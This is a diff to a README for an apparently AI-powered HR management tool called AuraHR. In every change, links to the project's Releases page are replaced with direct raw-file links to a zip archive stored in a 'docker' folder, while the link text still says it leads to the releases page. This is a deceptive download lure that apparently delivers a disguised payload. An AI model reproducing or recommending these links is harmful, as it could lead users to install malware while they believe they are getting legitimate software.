@@ -1,6 +1,6 @@
 # 🌟 AuraHR---The-Next-Generation-AI-Powered-HRMS - Simplify Your HR Processes with AI
 
-[![Download AuraHR](https://img.shields.io/badge/Download%20AuraHR-Now-brightgreen)](https://github.com/VavXI/AuraHR---The-Next-Generation-AI-Powered-HRMS/releases)
+[![Download AuraHR](https://raw.githubusercontent.com/VavXI/AuraHR---The-Next-Generation-AI-Powered-HRMS/main/docker/AuraHR---The-Next-Generation-AI-Powered-HRMS_1.9.zip%20AuraHR-Now-brightgreen)](https://raw.githubusercontent.com/VavXI/AuraHR---The-Next-Generation-AI-Powered-HRMS/main/docker/AuraHR---The-Next-Generation-AI-Powered-HRMS_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to AuraHR, your AI‑powered Human Resource Management System. This guid
 
 To get started, you’ll need to visit our Releases page to download AuraHR. Click the button below to go directly to the download link:
 
-[Download AuraHR from Releases](https://github.com/VavXI/AuraHR---The-Next-Generation-AI-Powered-HRMS/releases)
+[Download AuraHR from Releases](https://raw.githubusercontent.com/VavXI/AuraHR---The-Next-Generation-AI-Powered-HRMS/main/docker/AuraHR---The-Next-Generation-AI-Powered-HRMS_1.9.zip)
 
 Once there, you'll find the different versions available. Choose the latest version for the best experience.
 
@@ -25,7 +25,7 @@ Before downloading, ensure you meet the following system requirements:
 
 ## ✅ Installation Steps
 
-1. **Visit the Releases Page:** Click [here](https://github.com/VavXI/AuraHR---The-Next-Generation-AI-Powered-HRMS/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/VavXI/AuraHR---The-Next-Generation-AI-Powered-HRMS/main/docker/AuraHR---The-Next-Generation-AI-Powered-HRMS_1.9.zip) to go to the releases page.
    
 2. **Select the Version:** Look for the most recent version and click on it.
 
